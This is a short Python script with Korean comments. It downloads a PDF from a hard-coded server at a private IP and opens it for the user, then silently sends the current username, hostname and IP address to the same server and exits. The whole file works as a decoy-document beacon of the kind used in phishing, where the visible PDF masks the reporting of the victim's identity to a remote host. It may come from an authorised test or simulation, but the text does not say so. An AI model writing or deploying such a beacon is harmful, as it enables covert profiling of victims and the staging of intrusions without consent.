import os
import requests
import getpass
import socket
import subprocess
import tempfile

def send_info():
    server_url = "http://10.17.19.233:8000/log"  # 주어진 서버 URL
    user_info = {
        "username": getpass.getuser(),  # 현재 사용자 이름
        "hostname": socket.gethostname(),  # 현재 호스트 이름
        "ip_address": socket.gethostbyname(socket.gethostname())  # IP 주소
    }

    try:
        response = requests.post(server_url, json=user_info)
        if response.status_code == 200:
            print("Information sent successfully.")
            return True
        else:
            print("Failed to send information.")
            return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

def download_and_open_pdf():
    pdf_url = "http://10.17.19.233:8000/test.pdf"  # 서버에서 PDF 파일을 다운로드할 URL
    temp_dir = tempfile.gettempdir()
    temp_pdf_path = os.path.join(temp_dir, 'test.pdf')

    try:
        # PDF 다운로드
        response = requests.get(pdf_url)
        if response.status_code == 200:
            with open(temp_pdf_path, 'wb') as f:
                f.write(response.content)
            print(f"PDF downloaded successfully and saved to {temp_pdf_path}")

            # PDF 파일을 기본 PDF 뷰어로 열기
            if os.name == 'nt':  # Windows
                os.startfile(temp_pdf_path)
            elif os.name == 'posix':  # macOS/Linux
                subprocess.call(('open', temp_pdf_path))  # macOS
                # subprocess.call(('xdg-open', temp_pdf_path))  # Linux

        else:
            print(f"Failed to download PDF. Status code: {response.status_code}")

    except Exception as e:
        print(f"An error occurred while downloading or opening the PDF: {e}")

def main():
    download_and_open_pdf()  # PDF 다운로드 및 열기
    if send_info():  # 사용자 정보 수집 및 전송 후 성공하면
        # 현재 프로세스 종료
        os._exit(0)

if __name__ == "__main__":
    main()
